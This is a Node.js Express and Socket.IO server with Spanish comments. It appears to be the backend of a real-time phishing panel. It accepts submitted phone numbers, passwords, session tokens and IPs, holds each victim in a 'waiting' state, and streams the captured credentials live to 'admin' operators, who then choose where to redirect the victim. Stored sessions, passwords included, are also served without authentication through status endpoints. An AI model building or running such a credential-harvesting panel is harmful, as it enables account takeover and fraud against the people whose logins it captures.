const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  pingTimeout: 60000,
  pingInterval: 25000
});

app.use(cors());
app.use(express.json());

// Almacenamiento en memoria - SOLO sesiones activas
const activeSessions = new Map();
const adminSockets = new Set();

// Función para notificar a TODOS los admins INSTANTÁNEAMENTE
const notifyAllAdmins = (event, data) => {
  console.log(`📢 Notificando a ${adminSockets.size} admins: ${event}`);
  adminSockets.forEach(adminSocket => {
    if (adminSocket.connected) {
      try {
        adminSocket.emit(event, data);
        console.log(`✅ Evento ${event} enviado a admin: ${adminSocket.id}`);
      } catch (error) {
        console.log('❌ Error notificando admin:', error);
      }
    }
  });
};

// Función para obtener sesiones en espera
const getWaitingSessions = () => {
  return Array.from(activeSessions.values())
    .filter(s => s.status === 'waiting')
    .sort((a, b) => a.timestamp - b.timestamp);
};

// Endpoint PRINCIPAL para registrar sesiones desde login
app.post('/api/login', (req, res) => {
  const { countryCode, phoneNumber, password, ip, countryName, sessionId, token } = req.body;
  
  console.log(`🎯 NUEVO LOGIN RECIBIDO: ${sessionId} - ${countryCode}${phoneNumber}`);
  
  // CREAR SESIÓN NUEVA SIEMPRE
  const sessionData = {
    sessionId,
    countryCode: countryCode || "+1",
    phoneNumber: phoneNumber || "No especificado",
    password: password || "No especificado",
    token: token || "No especificado",
    ip: ip || "No encontrada",
    countryName: countryName || "Desconocido",
    timestamp: Date.now(),
    status: 'waiting',
    redirectTo: null,
    completedAt: null
  };
  
  // GUARDAR INMEDIATAMENTE
  activeSessions.set(sessionId, sessionData);
  
  // Obtener sesiones actualizadas
  const waitingSessions = getWaitingSessions();
  
  console.log(`📊 Sesiones en espera: ${waitingSessions.length}`);
  
  // NOTIFICAR A TODOS LOS ADMINS INMEDIATAMENTE - AMBOS EVENTOS
  notifyAllAdmins('new_session', sessionData);
  notifyAllAdmins('sessions_list', waitingSessions);
  
  res.json({ 
    success: true, 
    sessionId,
    message: `Login registrado y notificado a ${adminSockets.size} admins`
  });
});

// Endpoint para verificar redirección (polling)
app.get('/api/session/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  
  if (activeSessions.has(sessionId)) {
    const session = activeSessions.get(sessionId);
    res.json({ 
      success: true, 
      session: session,
      redirectTo: session.redirectTo 
    });
  } else {
    res.status(404).json({ success: false, error: 'Session not found' });
  }
});

// Endpoint para redirección desde admin
app.post('/api/session/:sessionId/redirect', (req, res) => {
  const { sessionId } = req.params;
  const { redirectTo, phoneNumber, emailAddress } = req.body;
  
  if (activeSessions.has(sessionId)) {
    const session = activeSessions.get(sessionId);
    session.status = 'completed';
    session.redirectTo = redirectTo;
    session.phoneNumber = phoneNumber;
    session.emailAddress = emailAddress;
    session.completedAt = Date.now();
    
    // Notificar a todos los admins
    const waitingSessions = getWaitingSessions();
    notifyAllAdmins('session_updated', session);
    notifyAllAdmins('sessions_list', waitingSessions);
    
    // Redirigir al usuario específico
    io.to(sessionId).emit('redirect', { redirectTo, phoneNumber, emailAddress });
    
    console.log(`🔄 Sesión ${sessionId} COMPLETADA → ${redirectTo}`);
    res.json({ success: true });
  } else {
    res.status(404).json({ success: false, error: 'Session not found' });
  }
});

// Endpoint para obtener estado actual
app.get('/api/status', (req, res) => {
  const waitingSessions = getWaitingSessions();
  
  res.json({
    success: true,
    activeSessions: activeSessions.size,
    waitingSessions: waitingSessions.length,
    connectedAdmins: adminSockets.size,
    sessions: waitingSessions
  });
});

// SOCKET.IO - Conexiones en tiempo real
io.on('connection', (socket) => {
  console.log('🔌 NUEVA CONEXIÓN:', socket.id);
  
  // ADMIN se conecta
  socket.on('admin_connect', () => {
    console.log('👨‍💼 ADMIN CONECTADO:', socket.id);
    adminSockets.add(socket);
    
    // Enviar estado actual INMEDIATAMENTE
    const waitingSessions = getWaitingSessions();
    socket.emit('sessions_list', waitingSessions);
    socket.emit('connection_established', { 
      message: 'Admin conectado',
      sessionCount: waitingSessions.length 
    });
    
    console.log(`📨 Estado enviado a admin ${socket.id}: ${waitingSessions.length} sesiones`);
  });
  
  // USUARIO se conecta para esperar redirección
  socket.on('user_connect', (sessionId) => {
    socket.join(sessionId);
    console.log('👤 Usuario conectado para sesión:', sessionId);
  });
  
  socket.on('disconnect', (reason) => {
    console.log('❌ Cliente desconectado:', socket.id, 'Razón:', reason);
    
    // Remover de admins si estaba
    if (adminSockets.has(socket)) {
      adminSockets.delete(socket);
      console.log('👨‍💼 Admin removido:', socket.id);
    }
  });
});

// Health check
app.get('/health', (req, res) => {
  const waitingSessions = getWaitingSessions();
    
  res.json({
    status: 'OK',
    timestamp: new Date().toISOString(),
    activeSessions: activeSessions.size,
    waitingSessions: waitingSessions.length,
    connectedAdmins: adminSockets.size
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
  console.log(`⚡ Listo para recibir logins y conexiones admin`);
});
